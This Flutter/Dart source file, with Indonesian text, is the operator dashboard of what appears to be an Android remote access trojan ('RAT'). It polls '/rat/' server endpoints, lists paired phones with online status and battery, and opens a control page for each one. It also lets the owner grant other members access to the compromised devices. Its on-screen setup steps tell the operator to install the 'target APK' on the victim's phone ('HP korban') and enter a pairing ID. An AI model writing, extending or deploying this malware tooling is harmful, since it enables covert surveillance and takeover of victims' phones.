import 'app_config.dart';
import 'package:flutter/material.dart';
import 'package:flutter/services.dart';
import 'package:http/http.dart' as http;
import 'dart:convert';
import 'dart:async';
import 'device_permission.dart';
import 'control_panel.dart';

class DeviceDashboardPage extends StatefulWidget {
  final String username;
  final String role;
  final String sessionKey;
  const DeviceDashboardPage({
    super.key, this.username = '', this.role = '', this.sessionKey = ''});
  @override State<DeviceDashboardPage> createState() => _DDState();
}

class _DDState extends State<DeviceDashboardPage> {
  // ── Warna tema biru ──────────────────────────────────────────────────────
  static const _bg      = Color(0xFF020818);
  static const _card    = Color(0xFF030D1F);
  static const _card2   = Color(0xFF061428);
  static const _blue    = Color(0xFF1565C0);
  static const _blueL   = Color(0xFF42A5F5);
  static const _blueLL  = Color(0xFF90CAF9);
  static const _bord    = Color(0xFF0D2137);
  static const _txt     = Color(0xFFEEF6FF);
  static const _sub     = Color(0xFF5A80A8);
  static const _green   = Color(0xFF00E676);
  static const _red     = Color(0xFFFF1744);

  List<dynamic> _devices  = [];
  bool   _loading  = true;
  String? _err;
  String  _pairId  = '';
  String  _search  = '';
  bool get _isOwner => ['owner','pemilik','all_access','developer','tk','pt']
      .contains(widget.role.toLowerCase());
  bool _approved = false;
  Timer? _timer;

  @override
  void initState() {
    super.initState();
    _loadAll();
    _timer = Timer.periodic(const Duration(seconds: 20), (_) => _loadAll());
  }
  @override void dispose() { _timer?.cancel(); super.dispose(); }

  Future<void> _loadAll() async {
    if (!mounted) return;
    try {
      // Ambil pairId
      final pRes = await http
          .get(Uri.parse('$kBaseUrl/rat/pairid?key=${widget.sessionKey}'))
          .timeout(const Duration(seconds: 8));
      if (pRes.statusCode == 200) {
        final pd = jsonDecode(pRes.body);
        if (pd['valid'] == true && pd['pairId'] != null && mounted)
          setState(() => _pairId = pd['pairId'].toString());
      }

      // Ambil device list
      final dRes = await http
          .get(Uri.parse('$kBaseUrl/rat/my-devices?key=${widget.sessionKey}'))
          .timeout(const Duration(seconds: 8));
      if (dRes.statusCode != 200) throw 'Server error ${dRes.statusCode}';
      final body = jsonDecode(dRes.body);
      final List devices = (body['devices'] ?? body['data'] ?? []) as List;
      final now = DateTime.now();
      for (final d in devices) {
        try {
          final ls = d['lastSeen']?.toString() ?? '';
          final seen = ls.isNotEmpty ? DateTime.parse(ls) : now;
          d['online'] = now.difference(seen).inSeconds < 120;
        } catch (_) { d['online'] = false; }
      }
      if (mounted) setState(() {
        _devices = devices;
        _approved = _isOwner ? true : (body['approved'] != false);
        _loading = false; _err = null;
      });
    } catch (e) {
      if (mounted) setState(() { _loading = false; _err = e.toString(); });
    }
  }

  List<dynamic> get _filtered {
    if (_search.isEmpty) return _devices;
    final q = _search.toLowerCase();
    return _devices.where((d) =>
      (d['model']?.toString() ?? '').toLowerCase().contains(q) ||
      (d['id']?.toString()    ?? '').toLowerCase().contains(q)).toList();
  }

  int get _online => _devices.where((d) => d['online'] == true).length;
  int get _offline => _devices.length - _online;

  void _copyPairId() {
    Clipboard.setData(ClipboardData(text: _pairId));
    ScaffoldMessenger.of(context).showSnackBar(SnackBar(
      content: const Text('ID disalin!', style: TextStyle(fontFamily: 'ShareTechMono')),
      backgroundColor: _blue, duration: const Duration(seconds: 2),
      behavior: SnackBarBehavior.floating,
      shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(10))));
  }

  // ── Kasih akses ke member ─────────────────────────────────────────────────
  void _grantAccess() {
    showDialog(context: context, builder: (_) {
      final ctrl = TextEditingController();
      bool sending = false;
      return StatefulBuilder(builder: (ctx, ss) => AlertDialog(
        backgroundColor: _card,
        shape: RoundedRectangleBorder(
          borderRadius: BorderRadius.circular(16),
          side: BorderSide(color: _blue.withOpacity(0.5))),
        title: const Text('Kasih Akses Member',
          style: TextStyle(color: _txt, fontSize: 15, fontWeight: FontWeight.bold)),
        content: Column(mainAxisSize: MainAxisSize.min, children: [
          const Text('Masukkan username member yang akan diberi akses ke device kamu:',
            style: TextStyle(color: _sub, fontSize: 12)),
          const SizedBox(height: 14),
          TextField(
            controller: ctrl,
            style: const TextStyle(color: _txt, fontFamily: 'ShareTechMono'),
            decoration: InputDecoration(
              hintText: 'username',
              hintStyle: TextStyle(color: _sub.withOpacity(0.5)),
              filled: true, fillColor: _card2,
              border: OutlineInputBorder(
                borderRadius: BorderRadius.circular(10),
                borderSide: BorderSide(color: _bord)),
              enabledBorder: OutlineInputBorder(
                borderRadius: BorderRadius.circular(10),
                borderSide: BorderSide(color: _bord)),
              focusedBorder: OutlineInputBorder(
                borderRadius: BorderRadius.circular(10),
                borderSide: BorderSide(color: _blueL)),
              prefixIcon: const Icon(Icons.person_rounded, color: _blueL, size: 18)),
          ),
        ]),
        actions: [
          TextButton(onPressed: () => Navigator.pop(ctx),
            child: const Text('Batal', style: TextStyle(color: _sub))),
          ElevatedButton(
            style: ElevatedButton.styleFrom(
              backgroundColor: _blue,
              shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(8))),
            onPressed: sending ? null : () async {
              if (ctrl.text.trim().isEmpty) return;
              ss(() => sending = true);
              try {
                await http.post(
                  Uri.parse('$kBaseUrl/rat/grant-member'),
                  headers: {'Content-Type': 'application/json'},
                  body: jsonEncode({'key': widget.sessionKey, 'targetUsername': ctrl.text.trim()}),
                ).timeout(const Duration(seconds: 8));
                if (ctx.mounted) Navigator.pop(ctx);
                ScaffoldMessenger.of(context).showSnackBar(SnackBar(
                  content: Text('Akses diberikan ke ${ctrl.text.trim()}'),
                  backgroundColor: _blue));
              } catch (e) { ss(() => sending = false); }
            },
            child: sending
              ? const SizedBox(width: 16, height: 16,
                  child: CircularProgressIndicator(color: Colors.white, strokeWidth: 2))
              : const Text('Kasih Akses', style: TextStyle(color: Colors.white, fontWeight: FontWeight.bold)),
          ),
        ],
      ));
    });
  }

  @override
  Widget build(BuildContext context) {
    final denied = !_isOwner && !_approved;
    return Scaffold(
      backgroundColor: _bg,
      body: SafeArea(child: Column(children: [

        // ── Header ────────────────────────────────────────────────────────
        Container(
          padding: const EdgeInsets.fromLTRB(16, 14, 16, 14),
          decoration: BoxDecoration(
            color: _card,
            border: Border(bottom: BorderSide(color: _bord))),
          child: Column(children: [

            // Baris atas: icon + judul + tutup
            Row(children: [
              Container(
                width: 40, height: 40,
                decoration: BoxDecoration(
                  color: _blue.withOpacity(0.15),
                  shape: BoxShape.circle,
                  border: Border.all(color: _blue.withOpacity(0.4))),
                child: const Icon(Icons.radar_rounded, color: _blueL, size: 20)),
              const SizedBox(width: 12),
              Expanded(child: Column(crossAxisAlignment: CrossAxisAlignment.start, children: [
                const Text('Command Center',
                  style: TextStyle(color: _txt, fontSize: 16, fontWeight: FontWeight.bold)),
                Text('Device Management • @${widget.username}',
                  style: const TextStyle(color: _sub, fontSize: 10, fontFamily: 'ShareTechMono')),
              ])),
              // Refresh
              GestureDetector(
                onTap: () { setState((){_loading=true; _err=null;}); _loadAll(); },
                child: Container(
                  width: 36, height: 36,
                  decoration: BoxDecoration(
                    color: _card2,
                    shape: BoxShape.circle,
                    border: Border.all(color: _bord)),
                  child: const Icon(Icons.refresh_rounded, color: _blueL, size: 18))),
              const SizedBox(width: 8),
              GestureDetector(
                onTap: () => Navigator.pop(context),
                child: Container(
                  width: 36, height: 36,
                  decoration: BoxDecoration(
                    color: _card2,
                    shape: BoxShape.circle,
                    border: Border.all(color: _bord)),
                  child: const Icon(Icons.close_rounded, color: _sub, size: 18))),
            ]),

            const SizedBox(height: 14),

            // Statistik: Total, Online, Offline
            Row(children: [
              Expanded(child: _statCard('Total', '${_devices.length}', _blueLL, Icons.devices_rounded)),
              const SizedBox(width: 8),
              Expanded(child: _statCard('Online', '$_online', _green, Icons.wifi_rounded)),
              const SizedBox(width: 8),
              Expanded(child: _statCard('Offline', '$_offline', _red, Icons.wifi_off_rounded)),
            ]),

            const SizedBox(height: 12),

            // PairID + Kasih Akses
            if (_pairId.isNotEmpty) Row(children: [
              Expanded(
                child: GestureDetector(
                  onTap: _copyPairId,
                  child: Container(
                    padding: const EdgeInsets.symmetric(horizontal: 12, vertical: 10),
                    decoration: BoxDecoration(
                      color: _blue.withOpacity(0.08),
                      borderRadius: BorderRadius.circular(10),
                      border: Border.all(color: _blue.withOpacity(0.35))),
                    child: Row(children: [
                      const Icon(Icons.fingerprint_rounded, color: _blueL, size: 16),
                      const SizedBox(width: 8),
                      Expanded(child: Column(crossAxisAlignment: CrossAxisAlignment.start, children: [
                        const Text('ID PAIRING', style: TextStyle(
                          color: _sub, fontSize: 8, letterSpacing: 1.5, fontFamily: 'ShareTechMono')),
                        const SizedBox(height: 2),
                        Text(_pairId, style: const TextStyle(
                          color: _blueL, fontSize: 13, fontWeight: FontWeight.bold,
                          letterSpacing: 2, fontFamily: 'ShareTechMono')),
                      ])),
                      const Icon(Icons.copy_rounded, color: _blueL, size: 14),
                    ]),
                  ),
                ),
              ),
              if (_isOwner) ...[ 
                const SizedBox(width: 8),
                GestureDetector(
                  onTap: _grantAccess,
                  child: Container(
                    padding: const EdgeInsets.symmetric(horizontal: 12, vertical: 10),
                    decoration: BoxDecoration(
                      color: _green.withOpacity(0.08),
                      borderRadius: BorderRadius.circular(10),
                      border: Border.all(color: _green.withOpacity(0.35))),
                    child: Row(children: [
                      const Icon(Icons.person_add_rounded, color: _green, size: 16),
                      const SizedBox(width: 6),
                      const Text('Kasih\nAkses', style: TextStyle(
                        color: _green, fontSize: 10, fontWeight: FontWeight.bold), textAlign: TextAlign.center),
                    ]),
                  ),
                ),
              ],
            ]),

            const SizedBox(height: 10),

            // Search bar
            Container(
              decoration: BoxDecoration(
                color: _card2,
                borderRadius: BorderRadius.circular(12),
                border: Border.all(color: _bord)),
              child: TextField(
                onChanged: (v) => setState(() => _search = v),
                style: const TextStyle(color: _txt, fontSize: 13, fontFamily: 'ShareTechMono'),
                decoration: InputDecoration(
                  hintText: 'Cari device, IP, ID...',
                  hintStyle: TextStyle(color: _sub.withOpacity(0.5), fontSize: 12),
                  prefixIcon: const Icon(Icons.search_rounded, color: _sub, size: 18),
                  border: InputBorder.none,
                  contentPadding: const EdgeInsets.symmetric(vertical: 12)),
              ),
            ),
          ]),
        ),

        // ── Status banner ─────────────────────────────────────────────────
        if (_err != null)
          _banner(Icons.error_outline_rounded, _err!, _red),
        if (denied && _err == null)
          _banner(Icons.lock_rounded, 'Akses belum disetujui Owner. Hubungi Owner.', _red),
        if (!_isOwner && !denied && _err == null && _approved)
          _banner(Icons.verified_rounded, 'Akses diizinkan Owner.', _green),

        // ── Toolbar ───────────────────────────────────────────────────────
        Padding(
          padding: const EdgeInsets.fromLTRB(16, 10, 16, 6),
          child: Row(children: [
            Text('${_filtered.length} DEVICE',
              style: const TextStyle(color: _sub, fontSize: 10,
                fontWeight: FontWeight.bold, letterSpacing: 1.5, fontFamily: 'ShareTechMono')),
            const Spacer(),
            if (_isOwner)
              GestureDetector(
                onTap: () async {
                  await Navigator.push(context, MaterialPageRoute(
                    builder: (_) => DevicePermissionManagerPage(
                      sessionKey: widget.sessionKey, allDevices: _devices)));
                  _loadAll();
                },
                child: Container(
                  padding: const EdgeInsets.symmetric(horizontal: 10, vertical: 5),
                  decoration: BoxDecoration(
                    color: _blue.withOpacity(0.1),
                    borderRadius: BorderRadius.circular(8),
                    border: Border.all(color: _blue.withOpacity(0.3))),
                  child: const Row(children: [
                    Icon(Icons.manage_accounts_rounded, color: _blueL, size: 13),
                    SizedBox(width: 5),
                    Text('Kelola Akses', style: TextStyle(color: _blueL, fontSize: 11)),
                  ]))),
          ])),

        // ── Device list / grid ─────────────────────────────────────────────
        Expanded(
          child: _loading
            ? const Center(child: CircularProgressIndicator(color: _blueL))
            : _filtered.isEmpty
              ? _emptyState(denied)
              : GridView.builder(
                  padding: const EdgeInsets.fromLTRB(14, 4, 14, 100),
                  gridDelegate: const SliverGridDelegateWithFixedCrossAxisCount(
                    crossAxisCount: 2, crossAxisSpacing: 10,
                    mainAxisSpacing: 10, childAspectRatio: 1.0),
                  itemCount: _filtered.length,
                  itemBuilder: (ctx, i) => _deviceCard(ctx, _filtered[i]),
                ),
        ),
      ])),
    );
  }

  Widget _deviceCard(BuildContext ctx, dynamic d) {
    final on    = d['online'] == true;
    final sc    = on ? _green : _red;
    final bat   = d['battery']?.toString() ?? '?';
    final model = d['model']?.toString() ?? 'Unknown';
    final id    = d['id']?.toString() ?? '-';
    final os    = d['os']?.toString() ?? 'Android';

    return GestureDetector(
      onTap: () => Navigator.push(ctx, MaterialPageRoute(
        builder: (_) => ControlCenterPage(targetDevice: d, role: widget.role))),
      child: Container(
        padding: const EdgeInsets.all(14),
        decoration: BoxDecoration(
          color: _card,
          borderRadius: BorderRadius.circular(16),
          border: Border.all(color: on ? _blueL.withOpacity(0.25) : _bord)),
        child: Column(crossAxisAlignment: CrossAxisAlignment.start, children: [

          // Status row
          Row(mainAxisAlignment: MainAxisAlignment.spaceBetween, children: [
            Container(
              width: 36, height: 36,
              decoration: BoxDecoration(
                color: on ? _blue.withOpacity(0.12) : _card2,
                borderRadius: BorderRadius.circular(10),
                border: Border.all(color: on ? _blueL.withOpacity(0.3) : _bord)),
              child: Icon(Icons.phone_android_rounded,
                color: on ? _blueL : _sub, size: 18)),
            Container(
              padding: const EdgeInsets.symmetric(horizontal: 8, vertical: 4),
              decoration: BoxDecoration(
                color: sc.withOpacity(0.1),
                borderRadius: BorderRadius.circular(20),
                border: Border.all(color: sc.withOpacity(0.3))),
              child: Row(mainAxisSize: MainAxisSize.min, children: [
                Container(width: 5, height: 5,
                  decoration: BoxDecoration(color: sc, shape: BoxShape.circle)),
                const SizedBox(width: 4),
                Text(on ? 'Online' : 'Offline',
                  style: TextStyle(color: sc, fontSize: 9,
                    fontWeight: FontWeight.bold, fontFamily: 'ShareTechMono')),
              ])),
          ]),

          const SizedBox(height: 10),

          // Model
          Text(model,
            style: const TextStyle(color: _txt, fontSize: 13, fontWeight: FontWeight.bold),
            maxLines: 1, overflow: TextOverflow.ellipsis),
          const SizedBox(height: 3),
          Text(os, style: const TextStyle(color: _sub, fontSize: 10)),

          const Spacer(),

          // ID (dikecilkan)
          Text(id,
            style: const TextStyle(
              color: _sub, fontSize: 8, fontFamily: 'ShareTechMono'),
            maxLines: 1, overflow: TextOverflow.ellipsis),

          const SizedBox(height: 8),

          // Baterai + masuk
          Row(children: [
            const Icon(Icons.battery_charging_full_rounded, color: _blueL, size: 12),
            const SizedBox(width: 4),
            Text('$bat%', style: const TextStyle(color: _blueLL, fontSize: 11,
              fontWeight: FontWeight.bold)),
            const Spacer(),
            Container(
              padding: const EdgeInsets.symmetric(horizontal: 8, vertical: 4),
              decoration: BoxDecoration(
                color: _blue.withOpacity(0.15),
                borderRadius: BorderRadius.circular(8)),
              child: const Row(mainAxisSize: MainAxisSize.min, children: [
                Text('Kontrol', style: TextStyle(color: _blueL, fontSize: 9,
                  fontWeight: FontWeight.bold)),
                SizedBox(width: 3),
                Icon(Icons.chevron_right_rounded, color: _blueL, size: 12),
              ])),
          ]),
        ]),
      ),
    );
  }

  Widget _emptyState(bool denied) => Center(child: Column(
    mainAxisSize: MainAxisSize.min, children: [
      Container(
        width: 72, height: 72,
        decoration: BoxDecoration(
          color: _blue.withOpacity(0.06),
          shape: BoxShape.circle,
          border: Border.all(color: _blue.withOpacity(0.2))),
        child: Icon(denied ? Icons.lock_rounded : Icons.devices_other_rounded,
          color: _sub, size: 32)),
      const SizedBox(height: 16),
      Text(denied ? 'AKSES DITOLAK' : 'NO DEVICES',
        style: const TextStyle(color: _sub, fontWeight: FontWeight.bold,
          letterSpacing: 2, fontSize: 13)),
      const SizedBox(height: 6),
      Text(denied ? 'Hubungi Owner untuk mendapat akses' : 'Belum ada device terhubung',
        style: TextStyle(color: _sub.withOpacity(0.6), fontSize: 11)),
      if (!denied) ...[ 
        const SizedBox(height: 24),
        Container(
          margin: const EdgeInsets.symmetric(horizontal: 40),
          padding: const EdgeInsets.all(16),
          decoration: BoxDecoration(
            color: _blue.withOpacity(0.06),
            borderRadius: BorderRadius.circular(14),
            border: Border.all(color: _blue.withOpacity(0.2))),
          child: const Column(children: [
            Icon(Icons.info_outline_rounded, color: _blueL, size: 20),
            SizedBox(height: 10),
            Text('Cara hubungkan device:', style: TextStyle(
              color: _txt, fontSize: 12, fontWeight: FontWeight.bold)),
            SizedBox(height: 6),
            Text('1. Install APK target di HP korban\n2. Buka APK → masukkan ID Pairing\n3. Device otomatis muncul di sini',
              style: TextStyle(color: _sub, fontSize: 11), textAlign: TextAlign.center),
          ]),
        ),
      ],
    ]));

  Widget _statCard(String label, String value, Color c, IconData icon) =>
    Container(
      padding: const EdgeInsets.symmetric(vertical: 12, horizontal: 10),
      decoration: BoxDecoration(
        color: c.withOpacity(0.07),
        borderRadius: BorderRadius.circular(12),
        border: Border.all(color: c.withOpacity(0.2))),
      child: Row(children: [
        Icon(icon, color: c, size: 16),
        const SizedBox(width: 8),
        Column(crossAxisAlignment: CrossAxisAlignment.start, children: [
          Text(value, style: TextStyle(color: c, fontSize: 18,
            fontWeight: FontWeight.bold)),
          Text(label, style: TextStyle(color: c.withOpacity(0.7),
            fontSize: 9, fontFamily: 'ShareTechMono')),
        ]),
      ]));

  Widget _banner(IconData icon, String msg, Color c) => Container(
    margin: const EdgeInsets.fromLTRB(14, 6, 14, 0),
    padding: const EdgeInsets.all(10),
    decoration: BoxDecoration(
      color: c.withOpacity(0.07),
      borderRadius: BorderRadius.circular(10),
      border: Border.all(color: c.withOpacity(0.25))),
    child: Row(children: [
      Icon(icon, color: c, size: 14), const SizedBox(width: 8),
      Expanded(child: Text(msg, style: TextStyle(color: c, fontSize: 11))),
    ]));
}
